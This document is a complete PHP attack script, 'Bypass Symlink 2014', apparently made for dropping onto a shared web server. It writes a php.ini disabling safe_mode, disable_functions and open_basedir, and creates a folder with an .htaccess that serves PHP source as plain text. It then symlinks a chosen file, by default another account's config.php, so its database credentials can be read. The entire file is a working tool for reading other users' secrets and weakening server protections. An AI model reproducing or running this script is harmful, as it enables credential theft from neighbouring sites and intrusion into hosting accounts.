<?php
echo "<html>\n";
?>
<head>
<title>Bypass Symlink 2014</title>
<link href="http://fonts.googleapis.com/css?family=Ubuntu&effect=fire-animation" rel="stylesheet" type="text/css">
<style type="text/css">
  html,body { margin: 0; padding: 0; outline: 0; }
a{ font-size: 12px; }
body { direction: ltr;  background:
url("") repeat ,
url("") no-repeat center top,top left,top right; background-color:black; color: rgb(0, 153, 0); text-align: center } input,textarea,select{ font-weight: bold; color: #000000; }
input,textarea,select:hover{ box-shadow: 0px 0px 4px #00cc00; }
.hedr { font-family: Tahoma, Arial, sans-serif  ;  font-size: 22px; }
.cont a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 16px; text-shadow: 0px 0px 3px ; }
.cont a:hover{ color: #FF0000 ;  text-shadow:0px 0px 3px #ff0000 ; }
.cone a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 12px; text-shadow: 0px 0px 3px ; }
.cone a:hover{ color: #FF0000 ; text-shadow:0px 0px 3px #ff0000 ; }
.tmp tr td{ border: solid 1px #006600; padding: 2px ; font-size: 13px; }
.tmp tr td a { text-decoration: none; }
.foter{ font-size: 9pt; color: #006600 ; text-align: center }
.tmp tr td:hover{ box-shadow: 0px 0px 4px #00cc00; }
.fot{ font-family:Tahoma, Arial, sans-serif; color: #009900 ; font-size: 11pt; }
.for a : hover{ color: #FF0000 ; text-shadow: 0px 0px 1px #FF0000; }
.ir { color: #FF0000; }
.tul { face:Tahoma, Geneva, sans-serif; font-size: 7pt; }
#menu a{ padding: 1px; border: 0px solid green; color: green; text-decoration: none;color: #009900; font-weight: bold; font-family: Tahoma, Geneva, sans-serif; font-size:12px; }
#menu a:hover{ border: 0px solid red; color: red; }
 
</style>
 <body bgcolor=black>
</head>
 
<?php
 
// Extract php.ini //
 
$fp = fopen("php.ini","w+");
fwrite($fp,"Safe_mode = OFF
Safe_mode_gid = OFF
Disable_Functions = NONE
Open_basedir = OFF
suhosin.executor.func.blacklist = NONE ");
 
 
 
echo '<br><b class="cont" align="center"><b class="font-effect-fire-animation" style=font-family:Ubuntu;font-size:25px;color:green;>Symlink Bypass</b></b><br><p align="center">';
echo'
<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="aafile" value="output.txt" size="60"/><br /><br />
<input type="submit" value="Bypass" name="symlink" /> <br /><br />
 
 
 
 
 
</form>
';
echo '<div class="tul"><b>PHP VERSION:</b> <font color="009900" face="shell, Geneva, sans-serif" style="font-size: 8pt">';echo phpversion();
 
$fichier = $_POST['file'];
$aafile = $_POST['aafile'];
$symlink = $_POST['symlink'];
 
if ($symlink)
{
 
 
 $dir = "anonangel";
                    if(file_exists($dir)) {
                            echo "<br><font color='red'>[+] anonangel Folder Already Exist °_° are you Drunk XD !!!</font><br />\n";
                    } else {
                            @mkdir($dir); {
                                    echo "<br><font color='red'>\!/ anonangel Folder Created ^_^ \!/</font><br />\n";
                                                                    echo "<br><font color='red'>\!/ $aafile Retrieved Successfully ^_^ \!/</font><br />\n";
 
                    } }
 
// Extract Priv8 htaccess File //                                      
$priv9  = "#Priv9 htaccess
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
DirectoryIndex $aafile
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
Options All
Options All
";
$f =@fopen ('anonangel/.htaccess','w');
@fwrite($f , $priv9);
 
@symlink("$fichier","anonangel/$aafile");
 
echo '<br /><a target="_blank" href="anonangel/" >'.$aafile.'</a>';
 
}
echo"<h3>
    <font color=aqua>Develop</font> <font color=white>By:</font> <font color=red>AnonAngel</font> <font color=orange>Team</font></h3>
        ";
       
echo"http://fb.com/955610707797621";       
?>